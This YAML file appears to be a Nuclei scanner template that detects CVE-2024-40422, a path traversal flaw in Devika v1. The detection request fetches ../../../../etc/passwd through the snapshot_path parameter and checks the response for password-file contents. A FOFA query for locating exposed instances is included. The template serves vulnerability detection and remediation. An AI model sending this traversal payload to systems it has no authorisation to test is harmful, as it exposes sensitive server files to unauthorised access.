flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body,"models","projects","OPENAI","OLLAMA")
    - contains(content_type,"application/json")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET /api/data HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - part: header
    type: word
    words:
    - application/octet-stream
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /api/get-browser-snapshot?snapshot_path=../../../../etc/passwd HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-40422
info:
  author: s4e-io,alpernae
  classification:
    cpe: cpe:2.3:a:stitionai:devika:1.0:*:*:*:*:*:*:*
    cve-id: CVE-2024-40422
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-22
    epss-percentile: 0.99758
    epss-score: 0.92895
  description: 'The snapshot_path parameter in the /api/get-browser-snapshot endpoint
    in stitionai devika v1 is susceptible to a path traversal attack. An attacker
    can manipulate the snapshot_path parameter to traverse directories and access
    sensitive files on the server. This can potentially lead to unauthorized access
    to critical system files and compromise the confidentiality and integrity of the
    system.

    '
  impact: 'Unauthenticated attackers can exploit path traversal to access sensitive
    files on the server.

    '
  metadata:
    fofa-query: icon_hash="-1429839495"
    max-request: 1
    product: devika
    vendor: stitionai
  name: Devika v1 - Path Traversal
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-40422
  - https://cvefeed.io/vuln/detail/CVE-2024-40422
  - https://github.com/alpernae/CVE-2024-40422
  - https://github.com/stitionai/devika
  - https://www.exploit-db.com/exploits/52066
  remediation: 'Update Devika to a version later than v1 that patches the path traversal
    vulnerability.

    '
  severity: critical
  tags: cve,cve2024,devika,lfi,vuln
